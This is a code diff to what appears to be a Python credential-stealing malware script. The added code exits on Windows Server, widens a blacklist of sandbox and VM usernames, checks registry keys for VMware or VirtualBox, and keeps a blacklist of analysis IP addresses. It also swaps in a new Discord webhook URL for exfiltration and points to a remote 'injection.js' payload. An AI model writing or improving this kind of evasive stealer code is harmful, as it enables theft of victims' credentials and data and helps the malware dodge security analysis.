@@ -11,6 +11,7 @@ import random
 import warnings
 import threading
 import subprocess
+import platform
 from sys import executable, stderr
 from base64 import b64decode
 from json import loads, dumps
@@ -18,6 +19,19 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+
+def is_windows_server():
+    if platform.system() == "Windows":
+        version = platform.version()
+        server_versions = ["Windows-Server-2003", "Windows-Server-2008", "Windows-Server-2008-R2", 
+                           "Windows-Server-2012", "Windows-Server-2012-R2", "Windows-Server-2016", 
+                           "Windows-Server-2019", "Windows-Server-2022"]
+        if any(server_version in platform.platform() for server_version in server_versions):
+            return True
+    return False
+
+if is_windows_server():
+    sys.exit(1)
 
 class NullWriter(object):
     def write(self, arg):
@@ -70,6 +84,7 @@ def check_windows():
     while True:
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
+
 def check_ip():
     blacklisted = {'34.17.49.70', '34.17.55.59', '34.75.28.66', '88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
     while True:
@@ -95,14 +110,18 @@ def check_registry():
         pass
 
 def check_windows():
-    blacklisted_usernames = {'Bruno', 'George'}  # google vm users
+    blacklisted_usernames = {
+        'Bruno', 'George', 'HARRY JOHNSON', 'Administrator', 'Test', 
+        'Guest', 'DefaultAccount', 'WDAGUtilityAccount', 'Sandbox', 'VMUser', 'QA', 'QATester',
+        'Developer', 'Dev', 'VirtualMachineUser', 'TestUser', 'Temp', 'TemporaryUser', 'ExampleUser'
+    }  # common VM users
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
     def winEnumHandler(hwnd, ctx):
         title = ctypes.create_string_buffer(1024)
         ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
         window_title = title.value.decode('Windows-1252').lower()
         for username in blacklisted_usernames:
-            if username in window_title:
+            if username.lower() in window_title:
                 pid = ctypes.c_ulong(0)
                 ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                 if pid.value != 0:
@@ -118,6 +137,23 @@ def check_windows():
     while True:
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
+
+def check_registry_vm():
+    try:
+        vm_keys = [
+            r'SYSTEM\ControlSet001\Services\Disk\Enum', r'SYSTEM\ControlSet001\Services\PartMgr\Enum',
+            r'SYSTEM\ControlSet001\Services\Disk\Enum', r'SYSTEM\ControlSet001\Services\PartMgr\Enum'
+        ]
+        for key in vm_keys:
+            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ)
+            subkey_count = winreg.QueryInfoKey(reg_key)[0]
+            for i in range(subkey_count):
+                subkey = winreg.EnumKey(reg_key, i)
+                if 'VMware' in subkey or 'VirtualBox' in subkey:
+                    exit_program(f'VM Registry Key Detected: {key}')
+            winreg.CloseKey(reg_key)
+    except:
+        pass
 
 def check_dll():
     sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
@@ -140,7 +176,7 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://discord.com/api/webhooks/1261248700899004426/VXfk-69xcTph7RTSEXBDq4cMRMiLRVGzXMvGThd4ZlQvS9kbnugMYUVqybWVuXh1G2z9"
+h00k = "https://discord.com/api/webhooks/1261152431446954036/CppU7uEwHS_3cCicHvjuPK5_fvi0g_cHX7JQSN_zCY0THDUZg2s_ym87bP8J4d2sVKKJ"
 inj3c710n_url = f"https://raw.githubusercontent.com/bGFpbg{cname}/index/main/injection.js"
 
 class DATA_BLOB(Structure):
